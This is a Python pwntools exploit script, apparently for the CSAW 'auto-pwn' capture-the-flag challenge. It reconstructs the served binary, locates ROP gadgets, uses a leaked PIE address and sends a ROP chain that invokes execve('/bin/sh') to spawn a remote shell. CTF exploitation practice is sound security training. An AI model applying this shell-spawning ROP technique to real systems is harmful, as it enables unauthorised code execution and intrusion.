import os
from pwn import *

if __name__=="__main__":
#    '''
    io = remote('auto-pwn.chal.csaw.io',11001)
    libc = ELF('./libc-2.24.so')
    io.recvuntil('>')
    io.sendline('8d16635db965bc4e0a97521e8105fad2')
    io.recvuntil('-------------------------------------------------------------------')
    binary = io.recvuntil('-------------------------------------------------------------------')
    binary = binary.decode('utf-8')
    with open('binary.c','w') as f:
        f.write(binary)
    os.popen('xxd -r binary.c > binary').read()
    os.popen('chmod +x binary').read()
    gadgets = os.popen('~/bin/rp++ -f test -r 5').read()
    system = os.popen('strings -tx test |grep /bin/sh').read()
    
    #print(system)
    #print(gadgets)
#    '''
#    io = process('./test')
#    io.recvuntil('>')
#    io.sendline('8d16635db965bc4e0a97521e8105fad2')
    
    io.recvuntil('Main is at ')
    pie_base = int(b'0x' + io.recvline().strip(),0) - 0x1421
    print(f'Pie @ {hex(pie_base)}')

    L_pop_rdi = pie_base + 0x000012f2
    L_pop_rsi = pie_base + 0x12e5
    L_pop_rdx = pie_base + 0x12ac
    L_pop_rax = pie_base + 0x129f
    L_syscall = pie_base + 0x1291

    L_ROP = [
    	b'A'*0x1,
	L_pop_rdi, L_pop_rdi, pie_base + 0x2029,
	L_pop_rsi, 0,
	L_pop_rdx, 0,
	L_pop_rax, 0x3b,
	L_syscall
    ]
    pause()
    io.sendline(flat(L_ROP,arch='amd64'))
    
    io.interactive()
